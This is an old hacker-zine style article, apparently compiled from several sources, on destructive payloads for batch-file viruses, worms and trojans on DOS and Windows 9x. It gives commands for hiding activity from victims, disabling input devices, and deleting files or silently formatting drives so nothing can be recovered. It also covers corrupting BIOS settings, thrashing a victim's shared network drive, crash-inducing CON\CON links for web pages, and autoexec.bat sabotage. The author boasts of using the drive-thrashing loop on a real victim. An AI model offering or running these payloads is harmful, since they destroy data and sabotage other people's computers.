 Note: My article has nothing to do with SAD1c`s "Some Nice Batch Payloads"
       article. It`s only a big coincidence, hope nobody is upset.


 Before puting a payload in your .bat virus/worm u should know those
3 tricks [many of you allready knowes them] to hide the monitor output.

  + ctty nul - redirects monitor output to nul

  + echo off - message like file deleted or copied will not be showed
               with this command

  + @ - the line with @ in front of it will not be displayed on the
        screen

 Note: When i was younger, kids like me writen on someone`z autoexec.bat
 =-=-  echo off command and that person formated his hard-disk coze he
       thought a new virus is in the wild. `;]

 Mouse and keyboard tricks:
 ===-===-===-===-===-===-==
  + @%windir%\rundll32.exe mouse,disable - disables the mouse
  
  + @%windir%\rundll32.exe keyboard,disable - disables the keyboard
  
  + @%windir%\rundll32.exe user,swapmousebutton - swaps the mouse buttons

 Undeleatable win9x folders:
 ===-===-===-===-===-===-===
  U can create a lot of those folders on someones computer. For example u
can flood his desktop or c:\my documents folder.

  +@md %windir%\DV£¿ >nul - it will create a undeleatable folder on windows
                            directory, if the folder allready exists, it
                            will not be created b-coze of the >nul command.

 Deleting files/folders:
 ===-===-===-===-===-===
  The usual payload of a virus/trojan/worm is to delete one or more file[z]
on a computer.

  + @deltree/y filename.ext >nul - it's the most dangerous commands [except
                                   format]

  + move nul filename.ext - it will send that file to nowhere [works only
                            one file per command]

  + copy nul filename.ext - same as move nul

  + format x:/q/u/autotest - dangerous and efficient, formats quickly,
                             unconditionaly so nothing to be recovered,
                             and autotest which will not show that someone`s
                             trying to format your hard.

Yeah yeah yeah I knwo what you're saying 'we use windows, why use dos?'.
Basically you can do a hellova lot more with a CLI than you can with a GUI
(at least at the moment you can) and it's easier to work with (as far as
I'm concerned!)

Some undocumented stuff to do in DOS (some of it good some of it not) ONLY TRY
THESE IF YOU WANT TO AND DON'T EVEN THINK ABOUT BLAMING ME IF YOU FUCK UP YOUR
COMPUTER!

Echo 123>clock$

This is a funky little command that overwrites your internal dos variable clock$ and
crashes your computer with a stack overflow. After rebooting you will notice that your
bios has been corrupted and depending on your bios, all your settings have been filled
with shit. Some BIOS's only get the date and time corrupted, but some actually completely
reset themselves (not nice if your bios doesn't have a HD autodetect!)

There are all sorts of internal variables that you can overwrite with the echo command.
To get a list of these type mem/debug/p and see what you can play with BUT BE CAREFUL!

 Swap file:
 ===-===-==

=-=[from The Worm (and how to create a simple one using common ingredients found around the home)]=-=

If the victim on the network has a shared directory (ie to play network doom etc..)
you can really play hell with their computer.

Map the victim's directory
Create a new directory on the victims shared directory.
create a bat file on your computer like this. (I'll use doom as an example)

:loop
copy x:\doom.wad x:\new\doom.wad
del x:\doom.wad
copy x:\new\doom.wad x:\doom.wad
del x:\new\doom.wad
goto loop

Basically, this copies the doom.wad backwards and forwards between the original directory
and the new directory. Bearing in mind that the doom.wad is about 15MB and is deleted
when copied, the victim just sees his hard drive going ballistic and all his processes
slow down to a crawl because he's having to share hard drive access between his swapfile
and a remote process (which doesn't affect the speed of your terminal!)

I did this to a victim and he ended up reformatting his HD because his computer was
running like a pig and hammering his HD all the time.

 Crash windoze:
 ===-===-===-==

 First, try to make a folder with those names:

 - CON, NUL, AUX, CLOCK$, CONFIG$, LPTx:, COMx: and PRN

 Well, u can`t. Windoze will encounter with "a folder with that name already exists"

 Combinations like CON\NUL, NUL\CON, AUX\NUL make windoze to crash itself.

 Examples:
 
 - <a href="c:\con\con"> - put it into a html file

 - <img src="c:\con\con"> - put it into a html file

 - file:///D|/c:\nul\nul - the url of a file

ok ... the actual bug is... as you know as in the batch program at the top...most ... 
windows create a directory... after another ... after another... and so on... contniously 
to about 120 subfolder's and can't create any more... dir's so it ends with error >>> 'can't 
create to file specified... or....??? look yourself
then look around the 2nd batch program...

it creates many foders ...in a folder ... and agasin in a folder.... several times.... 
right ...

here the exploit begin's.....

WINDOWS DEFAULT ZIP MANAGER CAN'T EXTRACT FOLDER'S HAVING MORE THAN 120 SUB DIRECTORIES... 
AND IF IT HAS TO... IT ASSUMES AS IF IT IS PASSWORD PROTECTED AND ASKES FOR PASSWORD ... 
EVEN WHEN NO PASSWORD IS SET... ((( so the job can't be accomplished)))

 DEMONSTRATION:
open the zip file...(exploit demonstration) and click the batch file "click_me_first.bat " 
it creates20 dirs...named 1  right...

then open the 20 th sub folder... the last one... \1\1\1\1..\ .............. and so on ...>>>
the 20th subfolder...

now poen the batch file named .... copy_me.bat

it will create 120 folders named 3 ....and start error... so stop the bath job aster windows 
can create no more dir's

now zip the  dir named 3 ...>>> with winxp default zip manager ....( the dir named3  has 120 
subfolder's in it...RIGHT ... ) and copy it to the 20th folder (sub-directory) of the directory 
named 1... and now man try extracting the dirfrom there ....


i mean.... 

the folder named 1 is in c:\ (root ) ... it has 20 subdirectories in it..... go to the 20th 
directory (the last one ) ... and copy the zip file that has 120 folders >>> subdir's in it.... 
right ??? 

and try extraching the file from there ... with winzp default zip manager... you will be soon 
asked for ... enter passowrd... ???
but you haven't set any password... nowhere right.... 

its because of the very long... directories length ... 20 +120 dirs from your root... so 
winxp can't extract the file and  the default zip manager assumes it to be password 
proteced ... and halts and askes for password....

 Time and date:
 ===-===-===-==

 You can have a silly revenge by writing allways changing date and time from autoexec.bat.

@echo.@time 00:00:00,00>c:\autoexec.bat

 Subst:
 ===-==

 Subst.com is used to substitute one thing for another. This can help u against virii attacks
but it can also be very useful for us. If u wanna play to someone a trick put this line in
autoexec and enjoy how windows reacts.

@echo off
@echo.subst e: a:\>c:\autoexec.bat

 Restart, Reboot, Shut Down, Log Off, Warm and cold Boot:
 ===-===-===-===-===-===-===-===-===-===-===-===-===-===-

 U can have your own fun by founding a new way to enjoy of those commands.

=-=-=-=-=-=[from http://www.geocities.com/~budallen/batfiles.html]=-=-=-=-=-=

rundll32.exe shell32.dll,SHExitWindowsEx n 

where n is one, or a combination of, the following numbers: 

0 - LOGOFF 

1 - SHUTDOWN 

2 - REBOOT 

4 - FORCE 

8 - POWEROFF 

The above options can be combined into one value to achieve different results. For example, 
to restart Windows forcefully, without querying any running programs, use the following 
command line: 

rundll32.exe shell32.dll,SHExitWindowsEx 6 

NOTE: Using the FORCE option can cause programs to lose data. 

Below is an explanation of each available option used with the above command line: 

LOGOFF - Shuts down all running processes, then logs the user off. 

POWEROFF - Shuts down the system and turns off the power. The system must support the 
power-off feature. 

REBOOT - Shuts down the system and then restarts the system. 

SHUTDOWN - Shuts down the system to a point at which it is safe to turn off the power.
All file buffers have been flushed to disk, and all running processes have stopped. 

FORCE - Forces processes to terminate. When this flag is set, Windows does not query running 
applications to inform them that Windows is shutting down. This can cause the applications to 
lose data, therefore, you should only use this flag in an emergency.
